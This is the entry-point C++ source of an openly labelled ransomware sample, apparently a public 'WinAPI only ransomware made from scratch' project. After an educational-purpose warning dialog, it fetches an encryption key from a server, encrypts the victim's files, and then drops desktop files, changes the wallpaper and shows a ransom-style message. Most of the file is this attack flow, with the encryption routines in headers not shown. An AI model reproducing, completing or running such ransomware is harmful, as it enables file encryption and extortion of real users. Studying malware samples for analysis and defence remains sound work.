/*
   ############################################
   # Copyright 2023 Panagiotis (MalwarePad)   #
   # WinAPI only ransomware made from scratch #
   ############################################
*/

#include "HandleInstallation.h"
#include "GetEncryptionKey.h"
#include "DecryptionPrompt.h"
#include "PostEncryption.h"

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	// Warning
	if (MessageBox(
		NULL,
		L"You're about to execute obvious malware designed for lab testing and education purposes. This sample will encrypt all of your files with a private key provided by a server. Do you want to proceed?",
		L"Warning!",
		MB_YESNO | MB_ICONWARNING
	) == IDNO) {
		MessageBox(NULL, L"Voided any damage being made! Aborting!", L"Phew...", MB_OK | MB_ICONASTERISK);
		return 1;
	}

	// Fetch private key
	std::string privateKey;
	if (!getEncryptionKey(&privateKey)) { // program has probably already been ran
		initiateDecryptionPrompt();
		return 0;
	};

	// Try encrypting
	if (!handleInstallation(privateKey, TRUE)) {
		MessageBox(NULL, L"Encryption method failed!", NULL, NULL);
		return 0;
	}

	// Post-encryption payloads
	dropDesktopFiles();
	changeWallpaper();
	finalMessageBox();

	return 1;
}
